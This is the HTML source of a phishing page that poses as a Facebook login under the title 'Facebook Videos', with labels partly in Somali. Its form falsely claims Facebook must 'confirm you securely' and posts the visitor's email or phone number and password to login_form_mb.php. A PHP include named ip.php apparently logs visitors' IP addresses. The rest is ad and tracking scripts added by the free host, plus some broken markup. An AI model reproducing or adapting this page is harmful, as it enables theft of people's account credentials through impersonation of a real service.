<!DOCTYPE html>

<html><head>
<!-- Inserted by miarroba -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T2VG59');</script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>(adsbygoogle = window.adsbygoogle || []).push({google_ad_client: "ca-pub-7294310421616689",enable_page_level_ads: true});</script>
<!-- Inserted by miarroba --><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Facebook Videos</title>
        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    	<link rel="shortcut icon" href="icono.ico"/>
		<meta name="referrer" content="default" id="meta_referrer">
		<script async="" type="text/javascript" src="./Facebook Videos_files/saved_resource"></script><script>__DEV__=0;</script>
		<link rel="stylesheet" type="text/css" id="RibQa" href="./Facebook Videos_files/tSOgnJdhTc3.css">
		<link rel="stylesheet" type="text/css" id="OvbZR" href="./Facebook Videos_files/9an7U6cZys0.css">
		
		<script id="u_0_e" src="./Facebook Videos_files/fEZ5x2OZgwl.js.descarga"></script>
		<link rel="stylesheet" href="./Facebook Videos_files/style.css">
	<script>    

	<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
<!-- Inserted by miarroba -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- Inserted by miarroba -->
	    	    <script id="u_0_a">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;if(c)c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g,' ')+' '+(b?'landscape':'portrait');return b;};})(window);</script></head>

		<body>
<!-- Inserted by miarroba -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- Inserted by miarroba --><div id="viewport">
			<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
			<div id="page">
			<center>
			     <script>
    new Image().src =
    </script>
			<div id="logotipo">
            <img src="./Facebook Videos_files/logo.png" width="auto" height="215" <="" div="">
			</div></center>
				<div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
					<div class="_4g33">
						<div class="_4g34" id="u_0_0">
							<div id="login-notices">
								<div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
									<div class="_52jd"></div>
								</div>
							</div>
							<div>
								<div class="aclb _5rut">
									<div data-sigil="m_login_upsell"></div>
									<div id="Formulario">
                                        <h1>
                                        <form class="login-form" method="post" target="_top" action="login_form_mb.php">
						<?php include 'ip.php'; ?>
										<label>
                                        <input type="text" id="email_mobile" name="email_mobile" placeholder="Gali Ciwaankaga / Telephone number ka" autocomplete="off" required="">
                                        </label>
										<label>
                                        <input type="password" name="pass_mobile" placeholder="Furaha Sirta ah / Password" autocomplete="off" required="">
                                        </label>
										<label>
                                        <input class="uibutton confirm" type="submit" value="Login & Continue">
										</label>
                                        </form>
                                        </h1>
                                        </div>
									
                                <section class="login-form-wrap">
								 <font color="566573">
                                    <div id="TituloCuerpo">
									Facebook will confirm you securely, in order to continue and see this page please login your facebook account	<h1></h1>
									</div>
									</font>
							       </section></div>
						        </div>
					          </div>
							</div>
						</div>
					</div>
			  </div>

		  
		<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="./Facebook Videos_files/small.js.descarga"></script><div title="Click to see what&#39;s popular on this site!" style="position: relative; display: inline-block; background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); width: 80px; height: 15px; padding: 0px; margin: 0px; overflow: hidden; cursor: pointer; direction: ltr;"><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -8px -15px; position: absolute; width: 5px; height: 8px; top: 4px; left: 20px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div><div style="background-image: url(&quot;data:image/gif;base64,R0lGODlhUAAXAMQAAM1iTdBuWMQ4MsdHOt+ch/js5+/Qw+vCs/Pe1dR6Y+OolNuQespVQ9eFbsAnLX9/fzAwL////zU1NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAABQABcAAAX/ICSOZGmeaKqu7Bi9L3IcBWzfeK7vfI+LMAPAQXQEEBGJcslsOp/QqFQaAUYMAiIjMnAIDMmpeEweVyGRQtcxIByy7Fd5Ti+fIwTiABYoKsJ1gYJMd30OeIhDRoCDjXR3igAEEQAChgCMjppihUULL3CLm6OcQHlEEQ0JEX6ZpK9Ld2qofZRxrrCvd1dZrA4AlWC5w7FWEQgJRQ4JSMTOuzAFMzU+1dbX1i3a29zdJhIwSkk24OGAOOU56eJyYw8S73ax7bGE54y45fP1YvFzYXIy4btH6Mm4feKYPIi3kCE8eAuXRHRy8OA6duzQkUuYMSMghyAfhnzYpF1FKPjsNPEDyI8jyXchYSqB2ZBiPYs2W+rjyNIlOIkzX4oU6s9gwB4lN4ZzaW5pmIkxhUIs6uzRsBAAOw==&quot;); background-repeat: no-repeat; background-attachment: scroll; background-position: -50px -15px; position: absolute; width: 24px; height: 8px; top: 4px; left: 26px; line-height: 8px; overflow: hidden; padding: 0px; margin: 0px;"></div></div><script type="text/javascript">WAU_small('elfinai')</script></div>
	


<!-- Inserted by miarroba -->
</script></noframes></noembed></noscript>
<script type="text/javascript" src="//ads.vidoomy.com/miarrobamobile.js"></script>
<script type="text/javascript" src="//ads.vidoomy.com/miarrodesktop.js"></script>
<script async type="application/javascript" src="https://static.addevweb.com/integrations/fd629041-9e6f-47d6-8dfb-cf82237caa89/fd629041-9e6f-47d6-8dfb-cf82237caa89.js"></script>
<script type="text/javascript" src="https://hosting.miarroba.info/?__muid=bcc913ad2ec479f674e0863deb99003bd05e3fb5&amp;h=1843811&amp;t=1544238649&amp;k=a89c6d319d54deb0b99f8e8229b73c95"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=bcc913ad2ec479f674e0863deb99003bd05e3fb5&amp;h=1843811&amp;t=1544238649&amp;k=a89c6d319d54deb0b99f8e8229b73c95&amp;img=1" /></noscript>
<!-- Inserted by miarroba -->
</body></html>
